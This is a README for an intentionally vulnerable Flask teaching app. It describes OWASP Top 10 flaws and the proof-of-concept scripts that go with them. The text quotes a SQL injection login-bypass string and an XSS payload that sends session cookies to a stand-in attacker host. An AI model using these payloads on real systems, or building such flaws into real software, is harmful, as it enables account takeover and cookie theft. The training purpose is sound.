# Insecure Web Application - OWASP Top 10 Demo

This is an intentionally vulnerable web application built with Python (Flask) and SQLite. It was designed to demonstrate common web security flaws and serves as an educational tool to test identification and exploitation of vulnerabilities mapped to the **OWASP Top 10**.

**⚠️ WARNING:** This application is completely insecure. Do not run this in a production environment or expose it to the internet. Run it only in isolated, local, or controlled test environments.

## Overview

The application features a basic chat system, user registration, an internal wallet system, a shop, and an admin panel. Throughout its functionality, several critical security misconfigurations and coding flaws have been purposefully introduced.

## Identified Vulnerabilities (OWASP Top 10)

The accompanying Python scripts and context reveal the presence of multiple vulnerabilities. Here is the breakdown based on the OWASP Top 10 list:

### 1. A01:2021 - Broken Access Control
- **Exploitation:** The application lacks proper authorization checks on sensitive endpoints.
- **Example (`BrokenAcessControl.py`):** An authenticated standard user can forcibly call the `/buy/<int:item_id>` endpoint or other unauthorized paths without adequate privileges or verification, manipulating application state directly.

### 2. A02:2021 - Cryptographic Failures
- **Exploitation:** Failure to protect sensitive data at rest.
- **Example (`CryptographicFailures.sql`):** The application stores user passwords in plain text within the SQLite database (`database.db`). An attacker gaining access to the database file can immediately read all credentials.

### 3. A03:2021 - Injection (SQLi & XSS)
- **SQL Injection (`Injection.py`):** 
  - The login mechanism concatenates user input directly into SQL queries rather than using parameterized queries.
  - **Attack:** Injecting payloads like `' OR '1'='1` in the password field allows bypassing authentication mechanics without a valid password.
- **Cross-Site Scripting (XSS) (`XSS.py`):**
  - The chat system (`/chat/<int:channel_id>`) does not sanitize user input before reflecting it to users.
  - **Attack:** An attacker can inject malicious JavaScript (e.g., `<script>fetch('http://attacker.tld/coletar?cookie=' + document.cookie);</script>`) into the chat, which executes in the victim's browser, potentially stealing session cookies.

### 4. A04:2021 - Insecure Design
- **Exploitation:** Conceptual architecture flaws, notably the lack of server-side business logic validation.
- **Example (`InsecureDesign.py`):** The `/add_funds` endpoint allows users to arbitrarily define the `amount` of funds they wish to add to their wallet. By intercepting the request and modifying the payload, a user can arbitrarily inflate their balance (e.g., `amount=999999`).

### 5. A07:2021 - Identification and Authentication Failures
- **Exploitation:** Poor session management or weak credential handling that permits session hijacking.
- **Example (`IdentificationandAuthenticationFailures.txt` / `admin_session.py`):** Session cookies are unencrypted and predictable, or lack proper expiration and binding. An attacker can steal a valid session cookie (often facilitated by the XSS vulnerability) and reuse it to hijack an ongoing session, such as gaining access to the `/admin_panel` via an administrative cookie.

## Setup and Running

1. **Prerequisites:** 
   - Python 3.x
   - Ensure you install the required dependencies (typically `flask` and `flask_socketio`).
     ```bash
     pip install Flask flask-socketio
     ```

2. **Starting the Application:**
   Run the main application file from the project directory. The database (`database.db`) will self-initialize upon the first run.
   ```bash
   cd ProgramaçãoSegura
   python app.py
   ```
   The application will run by default on `http://0.0.0.0:5000`.

3. **Running Exploits:**
   The `Scripts` folder contains the proof-of-concept scripts mapping to each vulnerability. For example, to run the SQL Injection script:
   ```bash
   cd Scripts
   python Injection.py
   ```

## Disclaimer

This project is strictly for educational purposes, security research, and capture-the-flag (CTF) environments. The creator assumes no liability for the misuse of this code or the techniques demonstrated herein.

---
**Pwned & Developed by [KnnnZzz](https://github.com/KnnnZzz)** 👾
*Creating intentionally vulnerable apps so you don't have to.*

#  _  __                 ____________          
# | |/ /                |__  /__  / /         
# | ' /_ __  _ __  _ __    / /   / / ____      
# |  <| '_ \| '_ \| '_ \  / /   / / |_  /      
# | . \ | | | | | | | | |/ /___/ /___/ /       
# |_|\_\_| |_|_| |_|_| |_|____/____/___|    
